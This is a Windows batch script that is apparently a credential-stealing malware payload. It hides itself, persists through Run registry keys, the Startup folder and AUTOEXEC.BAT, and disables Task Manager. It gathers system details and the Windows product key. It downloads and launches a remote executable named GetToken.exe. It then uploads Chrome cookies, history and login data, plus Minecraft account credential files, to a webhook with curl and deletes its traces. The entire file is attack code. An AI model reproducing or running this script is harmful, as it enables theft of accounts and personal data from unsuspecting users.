@echo off
attrib +h +s %0
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
cls
cd %userprofile%
set webhook=
curl -s -o IP.txt https://ipv4.wtfismyip.com/text
set /p IPv4=<IP.txt
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\apps.txt"
curl -v -F "chat_id=-6" -F document=@%userprofile%\apps.txt %webhook%
echo Username %username% >> userdata.txt
echo IP %ipv4% >> userdata.txt
echo. >> userdata.txt
ipconfig >> userdata.txt
echo. >> userdata.txt
getmac >> userdata.txt
echo. >> userdata.txt
wmic cpu get caption, name, deviceid, numberofcores, maxclockspeed, status >> userdata.txt
echo. >> userdata.txt
wmic computersystem get totalphysicalmemory >> userdata.txt
echo. >> userdata.txt
wmic partition get name,size,type >> userdata.txt
echo. >> userdata.txt
 systeminfo >> userdata.txt
echo. >> userdata.txt
wmic path softwareLicensingService get OA3xOriginalProductKey >> userdata.txt
echo. >> userdata.txt
echo. >> userdata.txt
echo. >> userdata.txt
curl -v -F "chat_id=-6" -F document=@%userprofile%\userdata.txt %webhook%
del userdata.txt
del apps.txt
cls
cd %userprofile%
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/971160786015772724/971191444410875914/GetToken.exe', 'GetToken.exe') "
start GetToken.exe
ping 127.0.0.1 3 > "e.txt"
start GetToken.exe
ping 127.0.0.1 3 > "e.txt"
curl -v -F "chat_id=-6" -F document=@"Tokens.txt" %webhook%
powershell "Compress-Archive %appdata%\.minecraft\mods %appdata%\modss.zip  -CompressionLevel "Fastest""
curl -v -F "chat_id=-6" -F document=@"%appdata%\mods.zisp" %webhook%
powershell "Compress-Archive %localappdata%\Google\Chrome\User Data\Default\Cookies %userprofile%\ChromeCookies.zip  -CompressionLevel "Fastest""
curl -v -F "chat_id=-6" -F document=@"%userprofile%\ChromeCookies.zip" %webhook%
powershell "Compress-Archive %localappdata%\Google\Chrome\User Data\Default\History %userprofile%\ChromeHistory.zip  -CompressionLevel "Fastest""
curl -v -F "chat_id=-6" -F document=@"%userprofile%\ChromeHistory.zip " %webhook%
powershell "Compress-Archive %localappdata%\Google\Chrome\User Data\Default\Shortcuts %userprofile%\ChromeShortcuts.zip  -CompressionLevel "Fastest""
curl -v -F "chat_id=-6" -F document=@"%userprofile%\ChromeShortcuts.zip" %webhook%
powershell "Compress-Archive %localappdata%\Google\Chrome\User Data\Default\Bookmarks %userprofile%\ChromeBookmarks.zip  -CompressionLevel "Fastest""
curl -v -F "chat_id=-6" -F document=@"%userprofile%\ChromeBookmarks.zip" %webhook%
powershell "Compress-Archive %localappdata%\Google\Chrome\User Data\Default\Login Data %userprofile%\ChromeLoginData.zip  -CompressionLevel "Fastest""
curl -v -F "chat_id=-6" -F document=@"%userprofile%\ChromeLoginData.zip" %webhook%
curl -v -F "chat_id=-6" -F document=@"%appdata%\.minecraft\launcher_msa_credentials.bin" %webhook%
curl -v -F "chat_id=-6" -F document=@"%appdata%\.minecraft\launcher_msa_credentials_microsoft_store.bin" %webhook%
curl -v -F "chat_id=-6" -F document=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
curl -v -F "chat_id=-6" -F document=@"%appdata%\.minecraft\launcher_accounts_microsoft_store.json" %webhook%
curl -v -F "chat_id=-6" -F document=@"%appdata%\.minecraft\launcher_product_state.json" %webhook%
curl -v -F "chat_id=-6" -F document=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
del GetToken.exe
del e.txt
del Tokens.txt
